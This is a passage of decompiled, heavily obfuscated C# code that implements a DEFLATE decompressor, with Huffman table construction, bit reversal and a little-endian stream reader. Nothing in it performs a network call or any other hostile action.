          while (*(int*) ((IntPtr) voidPtr + 48) < obj0.Length)
          {
            *(int*) ((IntPtr) voidPtr + 52) = (int) obj0[*(int*) ((IntPtr) voidPtr + 48)];
            if (*(int*) ((IntPtr) voidPtr + 52) != 0)
            {
              *(int*) ((IntPtr) voidPtr + 8) = numArray2[*(int*) ((IntPtr) voidPtr + 52)];
              *(int*) ((IntPtr) voidPtr + 56) = (int) \u008C.\u000F\u0002.\u000E\u0002(*(int*) ((IntPtr) voidPtr + 8));
              if (*(int*) ((IntPtr) voidPtr + 52) <= 9)
              {
                do
                {
                  this.\u0001[*(int*) ((IntPtr) voidPtr + 56)] = (short) (*(int*) ((IntPtr) voidPtr + 48) << 4 | *(int*) ((IntPtr) voidPtr + 52));
                  *(int*) ((IntPtr) voidPtr + 56) = *(int*) ((IntPtr) voidPtr + 56) + (1 << *(int*) ((IntPtr) voidPtr + 52));
                }
                while (*(int*) ((IntPtr) voidPtr + 56) < 512);
              }
              else
              {
                *(int*) ((IntPtr) voidPtr + 60) = (int) this.\u0001[*(int*) ((IntPtr) voidPtr + 56) & 511];
                *(int*) ((IntPtr) voidPtr + 64) = 1 << (*(int*) ((IntPtr) voidPtr + 60) & 15);
                *(int*) ((IntPtr) voidPtr + 60) = -(*(int*) ((IntPtr) voidPtr + 60) >> 4);
                do
                {
                  this.\u0001[*(int*) ((IntPtr) voidPtr + 60) | *(int*) ((IntPtr) voidPtr + 56) >> 9] = (short) (*(int*) ((IntPtr) voidPtr + 48) << 4 | *(int*) ((IntPtr) voidPtr + 52));
                  *(int*) ((IntPtr) voidPtr + 56) = *(int*) ((IntPtr) voidPtr + 56) + (1 << *(int*) ((IntPtr) voidPtr + 52));
                }
                while (*(int*) ((IntPtr) voidPtr + 56) < *(int*) ((IntPtr) voidPtr + 64));
              }
              numArray2[*(int*) ((IntPtr) voidPtr + 52)] = *(int*) ((IntPtr) voidPtr + 8) + (1 << 16 - *(int*) ((IntPtr) voidPtr + 52));
            }
            *(int*) ((IntPtr) voidPtr + 48) = *(int*) ((IntPtr) voidPtr + 48) + 1;
          }
        }
      }

      public unsafe int \u0004\u0002([In] \u008C.\u0099 obj0)
      {
        int num1;
        void* voidPtr;
        if (true)
        {
          int num2 = 16;
          int index;
          int num3;
          while (true)
          {
            // ISSUE: untyped stack allocation
            voidPtr = (void*) __untypedstackalloc(num2);
            if ((index = obj0.\u0091(9)) >= 0)
            {
              if ((num1 = (int) this.\u0001[index]) >= 0)
              {
                if (true)
                {
                  obj0.\u0092(num1 & 15);
                  num3 = num1;
                  if (false)
                    num2 = num3;
                  else
                    break;
                }
                else
                  goto label_8;
              }
              else
                goto label_5;
            }
            else
              goto label_13;
          }
          return num3 >> 4;
label_5:
          *(int*) voidPtr = -(num1 >> 4);
          *(int*) ((IntPtr) voidPtr + 4) = num1 & 15;
          int num4;
          if ((num4 = obj0.\u0091(*(int*) ((IntPtr) voidPtr + 4))) >= 0)
          {
            int num5 = (int) this.\u0001[*(int*) voidPtr | num4 >> 9];
            obj0.\u0092(num5 & 15);
            return num5 >> 4;
          }
          *(int*) ((IntPtr) voidPtr + 8) = obj0.\u0093();
          index = obj0.\u0091(*(int*) ((IntPtr) voidPtr + 8));
          num1 = (int) this.\u0001[*(int*) voidPtr | index >> 9];
label_8:
          if (true)
          {
            if ((num1 & 15) > *(int*) ((IntPtr) voidPtr + 8))
              return -1;
            obj0.\u0092(num1 & 15);
            if (true)
              return num1 >> 4;
            goto label_14;
          }
          else
            goto label_16;
label_13:
          *(int*) ((IntPtr) voidPtr + 12) = obj0.\u0093();
          index = obj0.\u0091(*(int*) ((IntPtr) voidPtr + 12));
label_14:
          num1 = (int) this.\u0001[index];
        }
        if (num1 < 0)
          goto label_18;
label_16:
        if ((num1 & 15) <= *(int*) ((IntPtr) voidPtr + 12))
        {
          obj0.\u0092(num1 & 15);
          return num1 >> 4;
        }
label_18:
        return -1;
      }
    }

    internal sealed class \u0008\u0002
    {
      private static readonly int[] \u0001;
      private static readonly int[] \u0002;
      private byte[] \u0003;
      private byte[] \u0004;
      private \u008C.\u0005\u0002 \u0005;
      private int \u0006;
      private int \u0007;
      private int \u0008;
      private int \u000E;
      private int \u000F;
      private int \u0010;
      private byte \u0011;
      private int \u0012;
      private static readonly int[] \u0013;

      public unsafe bool \u008E([In] \u008C.\u0099 obj0)
      {
        int num1 = 8;
        void* voidPtr;
        if (num1 != 0)
        {
          // ISSUE: untyped stack allocation
          voidPtr = (void*) __untypedstackalloc(num1);
          goto label_43;
        }
label_2:
        int num2;
        int num3;
        int num4;
        int num5;
        switch (num1)
        {
          case 0:
            this.\u0007 = obj0.\u0091(5);
            if (this.\u0007 < 0)
              return false;
            this.\u0007 += 257;
            obj0.\u0092(5);
            this.\u0006 = 1;
            goto case 1;
          case 1:
            this.\u0008 = obj0.\u0091(5);
            if (this.\u0008 >= 0)
            {
              ++this.\u0008;
              obj0.\u0092(5);
              this.\u000F = this.\u0007 + this.\u0008;
              this.\u0004 = new byte[this.\u000F];
              this.\u0006 = 2;
              goto case 2;
            }
            else
              break;
          case 2:
            this.\u000E = obj0.\u0091(4);
            if (this.\u000E < 0)
              return false;
            this.\u000E += 4;
            obj0.\u0092(4);
            this.\u0003 = new byte[19];
            this.\u0012 = 0;
            goto label_12;
          case 3:
label_19:
            num4 = this.\u0012;
            num5 = this.\u000E;
            if (true)
            {
              if (num4 < num5)
              {
                *(int*) voidPtr = obj0.\u0091(3);
                goto label_14;
              }
              else
              {
                this.\u0005 = new \u008C.\u0005\u0002(this.\u0003);
                this.\u0003 = (byte[]) null;
                this.\u0012 = 0;
                if (true)
                {
                  this.\u0006 = 4;
                  goto case 4;
                }
                else
                  break;
              }
            }
            else
              goto label_25;
          case 4:
label_27:
            int num6;
            if (((num6 = this.\u0005.\u0004\u0002(obj0)) & -16) == 0)
            {
              if (true)
              {
                byte[] numArray = this.\u0004;
                num2 = this.\u0012++;
                int index = num2;
                int num7 = (int) (this.\u0011 = (byte) num6);
                numArray[index] = (byte) num7;
                int num8 = this.\u0012;
                num5 = this.\u000F;
                num4 = num8;
                goto label_25;
              }
              else
                goto label_12;
            }
            else
            {
              if (num6 < 0)
                return false;
              if (num6 >= 17)
                this.\u0011 = (byte) 0;
              this.\u0010 = num6 - 16;
              if (true)
              {
                this.\u0006 = 5;
                goto case 5;
              }
              else
                goto case 5;
            }
          case 5:
            *(int*) ((IntPtr) voidPtr + 4) = \u008C.\u0008\u0002.\u0002[this.\u0010];
            num3 = obj0.\u0091(*(int*) ((IntPtr) voidPtr + 4));
            if (num3 < 0)
              return false;
            goto label_36;
          default:
            goto label_43;
        }
        return false;
label_12:
        this.\u0006 = 3;
        goto label_19;
label_14:
        int num9 = *(int*) voidPtr;
        if (false)
          return num9 != 0;
        if (num9 < 0)
          return false;
        obj0.\u0092(3);
        if (true)
        {
          this.\u0003[\u008C.\u0008\u0002.\u0013[this.\u0012]] = (byte) *(int*) voidPtr;
          ++this.\u0012;
          goto label_19;
        }
        else
          goto label_36;
label_25:
        if (num4 == num5)
          return true;
        goto label_27;
label_36:
        obj0.\u0092(*(int*) ((IntPtr) voidPtr + 4));
        num3 += \u008C.\u0008\u0002.\u0001[this.\u0010];
        while (num3-- > 0)
        {
          byte[] numArray = this.\u0004;
          num2 = this.\u0012++;
          int index = num2;
          int num10 = (int) this.\u0011;
          numArray[index] = (byte) num10;
        }
        if (true)
        {
          if (this.\u0012 == this.\u000F)
            return true;
          this.\u0006 = 4;
        }
        else
          goto label_14;
label_43:
        int num11 = this.\u0006;
        if (true)
          num2 = num11;
        num1 = num2;
        goto label_2;
      }

      public \u008C.\u0005\u0002 \u0006\u0002()
      {
        byte[] destinationArray = new byte[this.\u0007];
        Array.Copy((Array) this.\u0004, 0, (Array) destinationArray, 0, this.\u0007);
        return new \u008C.\u0005\u0002(destinationArray);
      }

      public \u008C.\u0005\u0002 \u0007\u0002()
      {
        byte[] destinationArray = new byte[this.\u0008];
        Array.Copy((Array) this.\u0004, this.\u0007, (Array) destinationArray, 0, this.\u0008);
        return new \u008C.\u0005\u0002(destinationArray);
      }

      static \u0008\u0002()
      {
label_0:
        int length1 = 3;
        int length2;
        while (true)
        {
          int[] numArray1 = new int[length1];
          // ISSUE: field reference
          RuntimeHelpers.InitializeArray((Array) numArray1, __fieldref (\u0013\u0002.\u000E));
          \u008C.\u0008\u0002.\u0001 = numArray1;
          do
          {
            if (true)
            {
              length2 = 3;
              if (length2 != 0)
              {
                int[] numArray2 = new int[length2];
                // ISSUE: field reference
                RuntimeHelpers.InitializeArray((Array) numArray2, __fieldref (\u0013\u0002.\u000F));
                \u008C.\u0008\u0002.\u0002 = numArray2;
              }
              else
                goto label_6;
            }
            else
              goto label_0;
          }
          while (false);
          length2 = 19;
label_6:
          if (length2 == 0)
            length1 = length2;
          else
            break;
        }
        int[] numArray = new int[length2];
        // ISSUE: field reference
        RuntimeHelpers.InitializeArray((Array) numArray, __fieldref (\u0013\u0002.\u0010));
        \u008C.\u0008\u0002.\u0013 = numArray;
      }
    }

    internal sealed class \u000F\u0002
    {
      private static readonly int[] \u0001;
      private static readonly byte[] \u0002;
      private static readonly short[] \u0003;
      private static readonly byte[] \u0004;
      private static readonly short[] \u0005;
      private static readonly byte[] \u0006;

      public static short \u000E\u0002([In] int obj0) => (short) ((int) \u008C.\u000F\u0002.\u0002[obj0 & 15] << 12 | (int) \u008C.\u000F\u0002.\u0002[obj0 >> 4 & 15] << 8 | (int) \u008C.\u000F\u0002.\u0002[obj0 >> 8 & 15] << 4 | (int) \u008C.\u000F\u0002.\u0002[obj0 >> 12]);

      static \u000F\u0002()
      {
label_0:
        \u008C.\u000F\u0002.\u0001 = new int[19]
        {
          16,
          17,
          18,
          0,
          8,
          7,
          9,
          6,
          10,
          5,
          11,
          4,
          12,
          3,
          13,
          2,
          14,
          1,
          15
        };
label_1:
        \u008C.\u000F\u0002.\u0002 = new byte[16]
        {
          (byte) 0,
          (byte) 8,
          (byte) 4,
          (byte) 12,
          (byte) 2,
          (byte) 10,
          (byte) 6,
          (byte) 14,
          (byte) 1,
          (byte) 9,
          (byte) 5,
          (byte) 13,
          (byte) 3,
          (byte) 11,
          (byte) 7,
          (byte) 15
        };
        \u008C.\u000F\u0002.\u0003 = new short[286];
        \u008C.\u000F\u0002.\u0004 = new byte[286];
        int index;
        if (true)
        {
          index = 0;
          goto label_23;
        }
        else
          goto label_7;
label_4:
        if (true)
        {
          \u008C.\u000F\u0002.\u0004[index++] = (byte) 8;
          goto label_23;
        }
        else
          goto label_8;
label_7:
        \u008C.\u000F\u0002.\u0004[index++] = (byte) 9;
label_8:
        if (index < 256)
        {
          \u008C.\u000F\u0002.\u0003[index] = \u008C.\u000F\u0002.\u000E\u0002(256 + index << 7);
          goto label_7;
        }
        else
        {
          if (true)
          {
            while (true)
            {
              int num1 = index;
label_13:
              if (num1 < 280)
              {
                \u008C.\u000F\u0002.\u0003[index] = \u008C.\u000F\u0002.\u000E\u0002(index - 256 << 9);
                if (true)
                  \u008C.\u000F\u0002.\u0004[index++] = (byte) 7;
                else
                  goto label_0;
              }
              else
              {
                for (; index < 286; \u008C.\u000F\u0002.\u0004[index++] = (byte) 8)
                  \u008C.\u000F\u0002.\u0003[index] = \u008C.\u000F\u0002.\u000E\u0002(index - 88 << 8);
                \u008C.\u000F\u0002.\u0005 = new short[30];
                \u008C.\u000F\u0002.\u0006 = new byte[30];
                if (true)
                {
                  int num2;
                  for (index = 0; index < 30; index = num2 + 1)
                  {
                    \u008C.\u000F\u0002.\u0005[index] = \u008C.\u000F\u0002.\u000E\u0002(index << 11);
                    if (true)
                    {
                      \u008C.\u000F\u0002.\u0006[index] = (byte) 5;
                      num2 = index;
                      if (false)
                      {
                        num1 = num2;
                        goto label_13;
                      }
                    }
                    else
                      goto label_1;
                  }
                  break;
                }
                goto label_4;
              }
            }
            return;
          }
          goto label_0;
        }
label_23:
        if (index < 144)
        {
          \u008C.\u000F\u0002.\u0003[index] = \u008C.\u000F\u0002.\u000E\u0002(48 + index << 8);
          goto label_4;
        }
        else
          goto label_8;
      }
    }

    internal sealed class \u0012\u0002 : MemoryStream
    {
      public int \u0010\u0002() => this.ReadByte() | this.ReadByte() << 8;

      public int \u0011\u0002() => this.\u0010\u0002() | this.\u0010\u0002() << 16;

      public \u0012\u0002([In] byte[] obj0)
        : base(obj0, false)
      {
      }
    }
  }
}
